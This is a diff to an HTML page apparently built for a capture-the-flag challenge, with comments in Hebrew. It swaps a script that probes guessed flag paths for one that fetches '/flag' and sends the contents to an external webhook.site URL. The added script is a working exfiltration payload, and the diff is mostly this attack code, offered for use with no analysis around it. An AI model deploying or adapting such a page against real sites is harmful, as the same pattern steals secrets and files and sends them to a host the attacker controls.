@@ -4,35 +4,14 @@
 <body>
   <h1>Scanning for Flag...</h1>
   <script>
-    const paths = [
-      '/flag', '/flag.txt', '/secret', '/secret.txt',
-      '/static/flag', '/hidden/flag.txt', '/home/ctf/flag', '/flag.html'
-    ];
+  fetch('/flag')
+    .then(r => r.text())
+    .then(flag => {
+      // שליחה ל־webhook שלך
+      fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?flag=' + encodeURIComponent(flag));
+    });
+</script>
 
-    let found = false;
-
-    const check = async () => {
-      for (const path of paths) {
-        try {
-          const res = await fetch(path);
-          const text = await res.text();
-
-          if (text.includes('flag{') || text.includes('CTF{')) {
-            document.body.innerHTML = `<h2 style="color:green;">🚩 FLAG FOUND:</h2><pre>${text}</pre>`;
-            found = true;
-            break;
-          }
-        } catch (e) {
-          // ממשיכים אם יש שגיאה
-        }
-      }
-
-      if (!found) {
-        document.body.innerHTML += `<p style="color:red;">❌ No flag found</p>`;
-      }
-    };
-
-    check();
-  </script>
 </body>
 </html>
+
